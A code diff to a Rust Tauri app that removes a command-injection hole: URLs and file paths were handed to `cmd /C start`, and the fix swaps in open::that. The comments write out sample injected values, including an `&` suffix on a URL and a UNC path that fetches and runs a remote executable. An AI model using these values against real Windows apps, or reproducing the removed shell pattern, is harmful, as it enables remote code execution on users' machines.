@@ -1396,27 +1396,35 @@ pub fn path_join(base: std::path::PathBuf, relative: String) -> Result<String, S
 /// fallback for YouTube tutorials: the inline embed can be refused by YouTube
 /// in the WebView (localhost/tauri.localhost origin), but the system browser
 /// always plays it.
+///
+/// NOT through a shell, and that is the whole point of this function's history.
+///
+/// It used to be `cmd /C start "" <url>` on Windows. Rust quotes an argument only when it
+/// contains a space, a tab or a quote — it does not escape cmd.exe's metacharacters, and cmd
+/// re-parses the line it is given. So `https://example.com&<command>` passed the http(s)
+/// check and cmd ran the second half. A space-free payload is enough to be dangerous:
+/// `&\\host\share\payload.exe` is a UNC path Windows will fetch over the network and run.
+///
+/// The URL is not always ours. `community.ts` renders BCWEB blog posts and COMMENTS through
+/// marked and hands every `a[href^=http]` in them to this command when clicked, and marked
+/// keeps `&` verbatim in an href. Anybody who can leave a comment could write the link.
+///
+/// The fix could not be to reject `&` — that is what a query string is made of, and BMM's own
+/// Discord invite carries three. So the shell is gone instead: `open::that` (already used by
+/// `open_external_url` in window.rs, which is why this needs no new dependency) hands the
+/// target to PowerShell through an environment variable, `Start-Process -FilePath
+/// $env:OPEN_RS_TARGET`, where nothing parses it. `open` sets CREATE_NO_WINDOW itself, so the
+/// no-console-flash rule the old hidden_command satisfied is still satisfied.
 #[tauri::command]
 pub fn open_external(url: String) -> Result<(), String> {
-    if !(url.starts_with("https://") || url.starts_with("http://")) {
+    // The scheme check stays a prefix check, and stays as it was: a string that literally
+    // starts with "https://" has that scheme, and there is no trick in that. The scheme was
+    // never what went wrong here — the shell was.
+    let u = url.trim();
+    if !(u.starts_with("https://") || u.starts_with("http://")) {
         return Err("refused: only http(s) URLs".into());
     }
-    #[cfg(target_os = "windows")]
-    {
-        crate::commands::proc::hidden_command("cmd")
-            .args(["/C", "start", "", &url])
-            .spawn()
-            .map_err(|e| e.to_string())?;
-    }
-    #[cfg(target_os = "macos")]
-    {
-        crate::commands::proc::hidden_command("open").arg(&url).spawn().map_err(|e| e.to_string())?;
-    }
-    #[cfg(target_os = "linux")]
-    {
-        crate::commands::proc::hidden_command("xdg-open").arg(&url).spawn().map_err(|e| e.to_string())?;
-    }
-    Ok(())
+    open::that(u).map_err(|e| e.to_string())
 }
 
 #[tauri::command]
@@ -1449,10 +1457,10 @@ pub fn open_folder(path: String) -> Result<(), String> {
 pub fn open_file(path: String) -> Result<(), String> {
     #[cfg(target_os = "windows")]
     {
-        crate::commands::proc::hidden_command("cmd")
-            .args(["/c", "start", "", &path])
-            .spawn()
-            .map_err(|e| e.to_string())?;
+        // open::that, not `cmd /c start` — see open_external above. `&` is a legal
+        // character in a Windows filename, so a mod folder called `thing&payload.exe`
+        // would have run the second half.
+        open::that(&path).map_err(|e| e.to_string())?;
     }
     #[cfg(target_os = "macos")]
     {
